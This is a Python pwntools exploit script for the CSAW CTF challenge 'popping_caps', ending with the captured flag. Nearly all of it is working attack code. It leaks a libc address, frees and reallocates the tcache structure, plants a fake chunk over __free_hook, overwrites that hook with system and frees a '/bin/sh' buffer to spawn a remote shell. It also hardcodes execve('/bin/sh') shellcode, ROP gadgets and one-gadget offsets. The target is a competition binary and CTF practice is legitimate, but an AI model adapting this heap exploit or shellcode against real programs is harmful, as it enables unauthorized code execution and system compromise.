#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './popping_caps'
binary = ELF(program_name)

remote_server = 'pwn.chal.csaw.io'
PORT = 1008

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============ PLT =========== #

alloc_PLT = 0x890
puts_PLT = 0x840
read_PLT = 0x870
fwrite_PLT = 0x8d0
__stack_chk_fail_PLT = 0x850
__cxa_finalize_PLT = 0x8e0
exit_PLT = 0x8c0
free_PLT = 0x82c
atol_PLT = 0x8b0
printf_PLT = 0x860
fgets_PLT = 0x880
setvbuf_PLT = 0x8a0

# ============ GOT =========== #

alloc_GOT = 0x201278
__gmon_start___GOT = 0x201218
puts_GOT = 0x201250
_ITM_registerTMCloneTable_GOT = 0x201220
stdout_GOT = 0x2012c0
read_GOT = 0x201268
fwrite_GOT = 0x201298
atol_GOT = 0x201288
stdin_GOT = 0x2012d0
system_GOT = 0x201208
free_GOT = 0x201248
__cxa_finalize_GOT = 0x201228
__libc_start_main_GOT = 0x201210
__stack_chk_fail_GOT = 0x201258
stderr_GOT = 0x2012e0
printf_GOT = 0x201260
fgets_GOT = 0x201270
exit_GOT = 0x201290
_ITM_deregisterTMCloneTable_GOT = 0x201200
setvbuf_GOT = 0x201280

# ============================================================== #
# ====================== GADGETS & MAGIC ======================= #
 # ============================================================== #

pop_rdi = 0x0000000000000ce3 # pop rdi; ret;
pop_rsi = 0x0000000000000ce1 # pop rsi; pop r15; ret;
pop_rbp = 0x0000000000000cdb # pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
pop_rbp = 0x0000000000000cdf # pop rbp; pop r14; pop r15; ret;
pop_rbp = 0x0000000000000950 # pop rbp; ret;
pop_rbp = 0x00000000000009a0 # pop rbp; ret;
pop_rbp = 0x00000000000009df # pop rbp; ret;
leave = 0x0000000000000a49 # leave; ret;
leave = 0x0000000000000c7e # leave; ret;
one_gag = [ 0x4f322, 0x10a38c, 0 ]
sys_off = 0x4f440
mal_hook_off = 0x3ebc30
free_hook_off = 0x3ed8e8

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

def add(size):
    p.sendlineafter('Your choice:','1')
    p.sendlineafter('How many:',str(size))

def edit(data):
    p.sendlineafter('Your choice:','3')
    p.sendafter('Read me in:',data)

def delete(idx):
    p.sendlineafter('Your choice:','2')
    p.sendlineafter('Whats in a free:',str(idx))

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    # Leak LIBC
    p.recvuntil('Here is system ')
    leak = int(p.recvline().strip(),16)-sys_off
    print 'LIBC=',hex(leak)

    # Allocate random chunk on the heap to init the ptr on the stack
    add(0x20)
    
    # Free Tcache Struct
    delete(-0x250)

    # Reallocate Tcache Struct
    add(0x248)
    
    # Set Fake Fastbin Chunk inside tcache bin
    edit('X'*0x48 + p64(leak+free_hook_off-8))
    
    # Retrieve Fake Chunk
    add(0x20)
    
    # Overwrite free_hook with system
    edit('/bin/sh\x00'+p64(leak+sys_off))

    # Get Shell
    delete(0)

    # ============ GDB =========== #
    #gdb.attach(p)
    p.interactive()


# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
# flag{don_t_you_wish_your_libc_was_non_vtabled_like_mine_29}
